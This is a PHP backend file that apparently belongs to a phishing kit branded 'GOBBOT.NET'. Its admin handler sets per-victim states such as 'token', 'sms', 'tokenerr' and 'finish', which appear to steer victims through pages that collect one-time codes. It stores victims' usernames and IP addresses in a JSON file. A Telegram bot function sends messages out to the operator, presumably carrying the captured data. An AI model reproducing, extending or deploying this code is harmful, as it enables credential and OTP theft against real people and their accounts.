<?php
/**
###############################################
#    𝗚𝗢𝗕𝗕𝗢𝗧.𝗡𝗘𝗧 🏴‍☠️ https://t.me/fatgov      #
###############################################
**/


define('DATA_FILE2', __DIR__ . '/../../../data.json');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'], $_POST['action'])) {
    $username = filter_var($_POST['username'], FILTER_SANITIZE_STRING);
    $action = filter_var($_POST['action'], FILTER_SANITIZE_STRING);

    if (in_array($action, ['token', 'sms','tokenerr', 'smserr', 'finish', 'delete'])) {
        if ($action === 'delete') {
            deleteUserFromDatabase($username);
        } else {
            update($username, $action);
        }
    }

    header('Location: admin.php');
    exit;
}




function getIP22(){
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
   }
   elseif(isset($_SERVER["HTTP_CLIENT_IP"])) {
       $ip = $_SERVER["HTTP_CLIENT_IP"];
   }
   elseif(isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
       $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
   }
   elseif(isset($_SERVER["HTTP_X_FORWARDED"])) {
       $ip = $_SERVER["HTTP_X_FORWARDED"];
   }
   elseif(isset($_SERVER["HTTP_FORWARDED_FOR"])) {
       $ip = $_SERVER["HTTP_FORWARDED_FOR"];
   }
   elseif(isset($_SERVER["HTTP_FORWARDED"])) {
       $ip = $_SERVER["HTTP_FORWARDED"];
   }
   else {
       $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : false;
   }
   if ($ip === '::1') {
       $ip = '127.0.0.1';
   }
   return $ip;
}

function ipmain() {
    return $_SERVER['REMOTE_ADDR'];
}

function loadDatabase() {
    if (!file_exists(DATA_FILE2)) {
        file_put_contents(DATA_FILE2, json_encode(['users' => []]));
    }
    $data = file_get_contents(DATA_FILE2);
    return json_decode($data, true);
}

function saveDatabase($data) {
   file_put_contents(DATA_FILE2, json_encode($data, JSON_PRETTY_PRINT));
 
}


function addUserToDatabase($username) {
    $username = filter_var($username, FILTER_SANITIZE_STRING);
    $data = loadDatabase();

    if (!isset($data['users'][$username])) {
        // Si el usuario no existe, se agrega con valores por defecto
        $data['users'][$username] = [
            'ip' => ipmain(),
            'acc' => '', // Reemplaza 'default_acc_value' con el valor por defecto deseado
            'status' => 'load'
        ];
    } else {
        // Si el usuario ya existe, solo se actualiza el campo 'acc'
        $data['users'][$username]['acc'] = ''; // Reemplaza 'default_acc_value' con el valor por defecto deseado
    }

    saveDatabase($data);
}


function cleanacc($username) {
    $username = filter_var($username, FILTER_SANITIZE_STRING);
    $data = loadDatabase();

    // Sobrescribe los datos del usuario con los valores por defecto
    $data['users'][$username] = ['ip' => ipmain(), 'acc' => '', 'status' => 'active'];

    saveDatabase($data);
}

function deleteUserFromDatabase($username) {
    $data = loadDatabase();
    if (isset($data['users'][$username])) {
        unset($data['users'][$username]);
        saveDatabase($data);
    }
}


function updateUserStatus($username, $status) {
    $data = loadDatabase();
    if (isset($data['users'][$username])) {
        $data['users'][$username]['status'] = $status;
    }
    saveDatabase($data);
}

function update($username, $status, $reset_acc = false) {
    $data = loadDatabase();

    if (!isset($data['users'][$username])) {
        $data['users'][$username] = ['acc' => '', 'status' => 'active'];
    }

    $data['users'][$username]['acc'] = $status;

    if ($reset_acc) {
        $data['users'][$username]['acc'] = '';  
    }

    saveDatabase($data);
}



function getUserStatus($username) {
    $data = loadDatabase();
    return $data['users'][$username]['status'] ?? '';
}

function getUseracc($username) {
    $data = loadDatabase();
    return $data['users'][$username]['acc'] ?? '';

}

function getUsersFromDatabase() {
    $data = loadDatabase();
    return $data['users'] ?? [];
}

function sendMessageToTelegram($message) {
    $apiToken = BOT_TOKEN;
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'html'
    ];
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?";
    file_get_contents($url . http_build_query($data));
}
